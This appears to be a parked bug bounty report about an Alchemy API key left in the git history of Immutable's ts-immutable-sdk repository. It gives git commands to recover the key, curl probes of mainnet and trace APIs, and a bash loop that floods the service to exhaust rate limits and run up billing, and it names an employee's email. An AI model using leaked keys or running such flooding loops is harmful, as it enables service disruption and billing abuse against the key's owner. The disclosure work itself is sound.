# Disclosure of Secrets - Alchemy API Key with Mainnet Access in Public Git History

**Status:** 🅿️ PARKED - Resubmission attempt for 001. Original was disputed by Bugcrowd. Even with mainnet access confirmed, Alchemy keys only access public blockchain data. No private data exposure possible.

## Summary

A verified active Alchemy API key (`yaWHtn...`) is exposed in the public git history of the `ts-immutable-sdk` repository. The key was committed by an Immutable employee using their corporate email address (`@immutable.com`). Contrary to initial assessment, this key provides **full mainnet access** across 6 blockchain networks. The key's tier is confirmed by feature availability: **Rollup Mainnets (Arbitrum, Optimism, Base) are Enterprise-only** per Alchemy's pricing page, while **Solana Mainnet and Trace/Debug APIs require PAYG or Enterprise** (not available on Free tier). The presence of Enterprise-only Rollup Mainnet access confirms this is an **Alchemy Enterprise tier account**.

## Ownership Attribution

The API key was committed by an Immutable employee and used in Immutable's DEX infrastructure:

```
$ git log --all --format="%H %ae %s" -S "yaWHtn"

53388b819aced98c792ffda1cf30339b035992f6 mikhala.kurtjak@immutable.com Swap to & dex config overrides for sepolia
edf2a7c8afd6f4485c868b4229f293888cfd47de 122326421+imx-mikhala@users.noreply.github.com WT-1335 Dex TO integration
ac52aed7ab58c998e6d0c368baa0393018c43da2 122326421+imx-mikhala@users.noreply.github.com WT-1349 Gas Fee Service
```

### Code Context

The key was used for **Immutable's DEX configuration** with their native IMX token ([view commit](https://github.com/immutable/ts-immutable-sdk/commit/53388b819aced98c792ffda1cf30339b035992f6)):

```typescript
// From commit 53388b819 - DexConfigOverrides.ts
export const getDexConfigOverrides = (): any => ({
  rpcURL: 'https://eth-sepolia.g.alchemy.com/v2/yaWHtn...[KEY]',
  nativeToken: {
    symbol: 'IMX',
    name: 'Immutable X Token',
  },
});
```

Later replaced with Immutable's own RPC endpoint ([view commit](https://github.com/immutable/ts-immutable-sdk/commit/3e8631885ac3d282004dcf9b210fae6ac724b290)):
```diff
- rpcURL: 'https://eth-sepolia.g.alchemy.com/v2/yaWHtn...[KEY]',
+ rpcURL: 'https://zkevm-rpc.dev.x.immutable.com',
```

### Why This Key Likely Belongs to Immutable

While we cannot directly query Alchemy for account ownership, the key's **Enterprise tier access** strongly suggests it belongs to Immutable rather than being a random public/demo key:

| Evidence | Why It Matters |
|----------|----------------|
| Rollup Mainnet access | Enterprise-only feature - not available on free/demo keys |
| Solana Mainnet access | PAYG/Enterprise only - not available on free tier |
| trace/debug APIs | PAYG/Enterprise only - not available on free tier |
| Committed by @immutable.com | Corporate email in official repository |

**A free or demo key would not have Enterprise-tier features.** The combination of Enterprise access + Immutable employee commit + Immutable's DEX codebase strongly indicates this is Immutable's paid Alchemy account.

## Business Impact

This exposed API key provides access to an **Alchemy Enterprise account** with mainnet access across multiple blockchain networks. The key was removed from code but **never rotated**, remaining active for over 2.5 years (since May 2023).

### Quantified Impact

Per [Alchemy's Compute Unit Costs](https://www.alchemy.com/docs/reference/compute-unit-costs) and [PAYG Pricing FAQ](https://www.alchemy.com/docs/reference/pay-as-you-go-pricing-faq):

**Pricing:** $0.45/1M CU (first 300M), $0.40/1M CU (after 300M)

**Method costs:**

| Method | Billing CU | Throughput CU | Max req/s (Enterprise 20K CUPs) |
|--------|------------|---------------|----------------------------------|
| trace_block | 20 | 20 | 1,000 req/s |
| debug_traceBlockByNumber | 40 | 1,000 | 20 req/s |

**Billing impact scenarios:**

| Attack Scenario | Requests/Day | CU/Day | Monthly Cost |
|-----------------|--------------|--------|--------------|
| trace_block @ 100 req/s | 8.64M | 172.8M | ~$2,089* |
| trace_block @ max throughput (1000 req/s) | 86.4M | 1.728B | ~$20,751* |
| debug_traceBlockByNumber @ max (20 req/s) | 1.73M | 69.1M | ~$844* |

*Costs include tiered pricing: first 300M at $0.45, remainder at $0.40 per million CU.*

### Attack Vectors

1. **Denial of Service**: Enterprise tier allows 700+ requests/second. An attacker exhausting this rate limit causes `429 Too Many Requests` errors for legitimate Immutable SDK users, breaking production applications.

2. **Billing Abuse**: Continuous expensive API calls (trace_block, debug_traceBlockByNumber) consume compute units that are charged to Immutable's account.

3. **Free Enterprise Infrastructure**: Attacker gains access to Enterprise-only features (Rollup Mainnets) without paying, using Immutable's paid subscription.

4. **Attribution Risk**: Malicious blockchain queries (e.g., scanning for vulnerable contracts) are logged under Immutable's Alchemy account.

## Steps to Reproduce

### Step 1: Retrieve the API Key from Git History

```bash
git clone https://github.com/immutable/ts-immutable-sdk.git
cd ts-immutable-sdk
git show 53388b819:packages/checkout/widgets-lib/src/widgets/swap/DexConfigOverrides.ts | grep alchemy
```

Output reveals the full API key on line 38:
```
rpcURL: 'https://eth-sepolia.g.alchemy.com/v2/yaWHtn...[REDACTED]'
```

### Step 2: Verify Mainnet Access (Not Just Testnet)

The `eth_chainId` method returns the network's chain ID, confirming which network the key can access:

```bash
# Ethereum Mainnet
curl -s -X POST "https://eth-mainnet.g.alchemy.com/v2/[KEY]" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}'
# Returns: {"jsonrpc":"2.0","id":1,"result":"0x1"}  (0x1 = Chain ID 1 = Ethereum Mainnet)

# Polygon Mainnet
curl -s -X POST "https://polygon-mainnet.g.alchemy.com/v2/[KEY]" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}'
# Returns: {"jsonrpc":"2.0","id":1,"result":"0x89"}  (0x89 = Chain ID 137 = Polygon Mainnet)
```

A successful response confirms the key has access to that mainnet. An invalid key would return an authentication error.

### Step 3: Verify Enterprise Tier (Rollup Mainnet Access)

Per [Alchemy's Pricing Page](https://www.alchemy.com/pricing), **Rollup Mainnets are Enterprise-only**:

![Alchemy Pricing - Rollups](Screenshot%202025-12-20%20at%2012.50.47%20PM.png)

| Feature | Free | Pay As You Go | Enterprise |
|---------|------|---------------|------------|
| Rollups - Mainnet | — | — | ✓ |
| Rollups - Testnet | — | ✓ | ✓ |
| Debug API | — | ✓ | ✓ |
| Trace API | — | ✓ | ✓ |

The exposed key provides full access to Rollup Mainnets, confirming Enterprise tier:

```bash
# Arbitrum Mainnet - Enterprise only (PAYG restricted to testnet)
curl -s -X POST "https://arb-mainnet.g.alchemy.com/v2/[KEY]" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}'
# Returns: {"jsonrpc":"2.0","id":1,"result":"0xa4b1"}  (0xa4b1 = Chain ID 42161 = Arbitrum One)

# Optimism Mainnet - Enterprise only
curl -s -X POST "https://opt-mainnet.g.alchemy.com/v2/[KEY]" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}'
# Returns: {"jsonrpc":"2.0","id":1,"result":"0xa"}  (0xa = Chain ID 10 = Optimism Mainnet)

# Base Mainnet - Enterprise only
curl -s -X POST "https://base-mainnet.g.alchemy.com/v2/[KEY]" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}'
# Returns: {"jsonrpc":"2.0","id":1,"result":"0x2105"}  (0x2105 = Chain ID 8453 = Base Mainnet)
```

### Step 4: Verify Paid Tier Features (trace/debug APIs)

Per [Alchemy's Pricing Plans](https://www.alchemy.com/docs/reference/pricing-plans), Debug API and Trace API are **not available on Free tier** - they require PAYG or Enterprise plans.

```bash
# trace_block - not available on free accounts
curl -s -X POST "https://eth-mainnet.g.alchemy.com/v2/[KEY]" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"trace_block","params":["latest"],"id":1}'
# Returns: Full trace data (not an error)

# debug_traceBlockByNumber - not available on free accounts
curl -s -X POST "https://eth-mainnet.g.alchemy.com/v2/[KEY]" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"debug_traceBlockByNumber","params":["latest",{}],"id":1}'
# Returns: Full debug trace data (not an error)
```

### Step 5: Verify Solana Mainnet Access (PAYG and Enterprise Feature)

Per [Alchemy's Pricing Page](https://www.alchemy.com/pricing), Solana Mainnet access requires PAYG or Enterprise tier:

![Alchemy Pricing - Solana](Screenshot%202025-12-20%20at%201.00.44%20PM.png)

```bash
# Solana Mainnet - PAYG/Enterprise only
curl -s -X POST "https://solana-mainnet.g.alchemy.com/v2/[KEY]" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"getSlot","params":[],"id":1}'
# Returns: {"jsonrpc":"2.0","id":1,"result":388026214}  (current slot number = successful access)
```

## Proof of Concept

### Verified Capabilities

| Capability | Status | Tier Requirement |
|------------|--------|------------------|
| Ethereum Mainnet (0x1) | ACTIVE | Free+ |
| Polygon Mainnet (0x89) | ACTIVE | Free+ |
| Arbitrum Mainnet (0xa4b1) | ACTIVE | **Enterprise only** ([pricing](https://www.alchemy.com/pricing)) |
| Optimism Mainnet (0xa) | ACTIVE | **Enterprise only** ([pricing](https://www.alchemy.com/pricing)) |
| Base Mainnet (0x2105) | ACTIVE | **Enterprise only** ([pricing](https://www.alchemy.com/pricing)) |
| Solana Mainnet | ACTIVE | PAYG and Enterprise ([pricing](https://www.alchemy.com/pricing)) |
| trace_block API | ACTIVE | PAYG and Enterprise ([docs](https://www.alchemy.com/docs/reference/pricing-plans)) |
| debug_traceBlockByNumber | ACTIVE | PAYG and Enterprise ([docs](https://www.alchemy.com/docs/reference/pricing-plans)) |
| alchemy_getTokenBalances | ACTIVE | Free+ |
| alchemy_getAssetTransfers | ACTIVE | Free+ |
| NFT API v3 | ACTIVE | Free+ |

### Key Details

| Field | Value |
|-------|-------|
| Repository | immutable/ts-immutable-sdk |
| Original Commit | 53388b819aced98c792ffda1cf30339b035992f6 |
| Committer Email | mikhala.kurtjak@immutable.com |
| File Path | packages/checkout/widgets-lib/src/widgets/swap/DexConfigOverrides.ts |
| API Key Prefix | `yaWHtn...` |
| Account Tier | **Enterprise** - confirmed by Rollup Mainnet access (PAYG restricted to testnet per [pricing](https://www.alchemy.com/pricing)) |
| Exposed Since | May 2023 (~31 months / 2.5+ years) |

### Rate Limit Exhaustion PoC

```bash
# Attacker can exhaust rate limits with expensive trace calls
# Each trace_block returns ~810KB of data and consumes 20 CU
while true; do
  for i in {1..100}; do
    curl -s -X POST "https://eth-mainnet.g.alchemy.com/v2/[KEY]" \
      -H "Content-Type: application/json" \
      -d '{"jsonrpc":"2.0","method":"trace_block","params":["latest"],"id":1}' &
  done
  wait
done
```

**Measured response sizes:**
- `eth_blockNumber`: 45 bytes (baseline)
- `trace_block`: **810,134 bytes** (810 KB per call)
- `debug_traceBlockByNumber`: **554,125 bytes** (554 KB per call)

Running this continuously exhausts Immutable's Enterprise rate limit (700+ req/s), causing `429 Too Many Requests` errors for legitimate SDK users and consuming billable compute units.

## Recommendation

1. **Immediately rotate the Alchemy API key** in the Alchemy dashboard
2. **Audit Alchemy usage logs** for unauthorized access since May 2023
3. **Remove the key from git history** using BFG Repo Cleaner or git filter-branch
4. **Enable GitHub secret scanning** to prevent future exposures
5. **Review billing** for any anomalous usage charges

## References

- Exposed commit: https://github.com/immutable/ts-immutable-sdk/commit/53388b819aced98c792ffda1cf30339b035992f6
- Alchemy Pricing Plans (trace/debug APIs require PAYG or Enterprise): https://www.alchemy.com/docs/reference/pricing-plans
- Alchemy Pricing: https://www.alchemy.com/pricing
- Alchemy Compute Unit Costs: https://www.alchemy.com/docs/reference/compute-unit-costs
- Alchemy PAYG Pricing FAQ: https://www.alchemy.com/docs/reference/pay-as-you-go-pricing-faq

## Attachments

- `Screenshot 2025-12-20 at 12.50.47 PM.png` - Alchemy pricing page showing Rollups Mainnet is Enterprise-only
- `Screenshot 2025-12-20 at 1.00.44 PM.png` - Alchemy pricing page showing Solana Mainnet requires PAYG or Enterprise
